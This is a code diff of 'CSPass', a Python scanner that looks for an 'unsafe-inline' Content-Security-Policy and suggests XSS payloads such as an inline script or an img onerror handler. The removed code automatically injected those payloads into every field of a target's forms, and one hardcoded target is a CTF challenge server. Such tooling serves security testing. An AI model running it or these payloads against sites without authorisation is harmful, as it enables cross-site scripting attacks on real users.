@@ -8,26 +8,18 @@ import datetime
 import requests
 import re
 from bs4 import BeautifulSoup as bs
-from requests.sessions import session
 import time
 
 def date_formatted():
     return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
-exploits = {
-    'unsafe-inline' : [
-        '<script>g=document.createElement("p");g.setAttribute("id", "testing_exploit");</script>',
-        '<img src=# onerror="g=document.createElement(\'p\');g.setAttribute(\'id\', \'testing_exploit\');">'
-        ]
-    }
-
 class Colors:
     # Foreground:
-    PURPLE = '\033[95m'
+    FAIL = '\033[95m'
     BLUE = '\033[94m'
     GREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
+    YELLOW = '\033[93m'
+    ERROR = '\033[91m'
 
     # Formatting
     BOLD = '\033[1m'
@@ -38,10 +30,20 @@ class Colors:
     NC ='\x1b[0m' # No Color
 
 class Scanner:
-    def __init__(self, target, no_colors=False):
+
+    general_payload = "alert()"
+    exploits = {
+        "script-src 'unsafe-inline'" : [
+            f'<script>{general_payload}</script>',
+            f'<img src=# onerror="{general_payload}">'
+            ]
+        }
+
+    def __init__(self, target, no_colors=False, dynamic=False):
         self.no_colors = no_colors
         self.target = target
-        self.working_payload = ""
+        self.dynamic = dynamic
+        self.exploitable = False
         self.print()
         self.print("[<]==============================[>]")
         self.print("[<]    Python CSPass @Ruulian_   [>]")
@@ -60,51 +62,42 @@ class Scanner:
         headers = r.headers
 
         if 'Content-Security-Policy' in headers:
-            self.csp = headers['Content-Security-Policy']
+            self.csp = headers['Content-Security-Policy'].split("; ")
             return True
         else:
             return False
 
     def info(self, message=""):
         self.print(f"[{Colors.BLUE}{date_formatted()}{Colors.END}] {message}")
+    
+    def vuln(self, message=""):
+        self.print(f"[{Colors.YELLOW}VULN{Colors.END}] {message}")
+
+    def fail(self, message=""):
+        self.print(f"[{Colors.FAIL}FAIL{Colors.END}] {message}")
 
     def error(self, message=""):
-        self.print(f"[{Colors.FAIL}ERROR{Colors.END}] {message}")
+        self.print(f"[{Colors.ERROR}ERROR{Colors.END}] {message}")
         self.print()
         exit()
 
-    def exploit(self, vuln):
-        r = self.sess.get(self.target)
-        soup = bs(r.text, 'html.parser')
-        form = soup.find("form")
-        if form is not None:
-            action = form['action']
-            method = form['method']
-            inputs = form.find_all("input") + form.find_all("textarea")
-            names = [k['name'] for k in inputs]
-            current_vuln = exploits[vuln]
+    def scan(self):
+        for vuln, exploit in self.__class__.exploits.items():
+            r = re.compile(vuln.replace(' ', '.+'))
+            for policy in self.csp:
+                if r.match(policy):
+                    self.vulnerability = vuln
+                    self.vuln(f"Potential vulnerability found: {policy}")
+                    self.vuln(f"Potential working payload: {exploit[0]}")
+                    return True
+        return False
 
-            for current_exploit in current_vuln:
-                for name in names:
-                    if method == "get":
-                        testing_exploit = self.sess.get(action, params={name : current_exploit})
-                    elif method == "post":
-                        testing_exploit = self.sess.post(action, data={name : current_exploit})
-                    
-                    xss_tested_soup = bs(testing_exploit.text, 'html.parser')
-                    result = xss_tested_soup.find("p", attrs={'id':'testing_exploit'})
-
-                    if result is not None:
-                        working_payload = current_exploit.replace('document.write(\'<p id="testing_exploit">testing_exploit</p>\');', 'alert()')
-                        self.working_payload = working_payload
-                        self.print(f"[{Colors.GREEN}SUCCEED{Colors.END}] Payload found: {working_payload}")
-                        return
-                    time.sleep(0.3)
 
 def parse_args():
     parser = argparse.ArgumentParser(add_help=True, description='Bypass CSP to perform a XSS')
 
-    parser.add_argument("--no-colors", action="store_true", help="Disable color mode")
+    parser.add_argument("--no-colors", dest="no_colors", action="store_true", help="Disable color mode")
+    parser.add_argument("-d", "--dynamic", dest="dynamic", action="store_true", help="Use dynamic mode (uses selenium)")
 
     required_args = parser.add_argument_group("Required argument")
     required_args.add_argument("-t", "--target", help="Specify the target url",  required=True)
@@ -116,9 +109,8 @@ def parse_args():
     return args
 
 if __name__ == '__main__':
-    vulns = ["unsafe-inline"]
-    scan = Scanner("http://challenge01.root-me.org:58008")
-    #scan = Scanner("https://0xhorizon.eu")
+    args = parse_args()
+    scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic)
     scan.info(f"Starting scan on {scan.target}")
 
     if scan.is_csp:
@@ -126,10 +118,10 @@ if __name__ == '__main__':
     else:
         scan.error("No Content Security Policy")
 
-    for vuln in vulns:
-        if vuln in scan.csp:
-            scan.print(f"[{Colors.WARNING}VULN{Colors.END}] Potential vulnerability found")
-            scan.info("Testing vulnerability ...")
-            scan.exploit(vuln)
-            if scan.working_payload != "":
-                break
+    exploitable = scan.scan()
+    if exploitable and scan.dynamic:
+        scan.info("Starting exploit ...")
+    elif exploitable:
+        scan.print("[>] Use -d/--dynamic flag to use the dynamic mode")
+    else:
+        scan.fail("No exploit found")
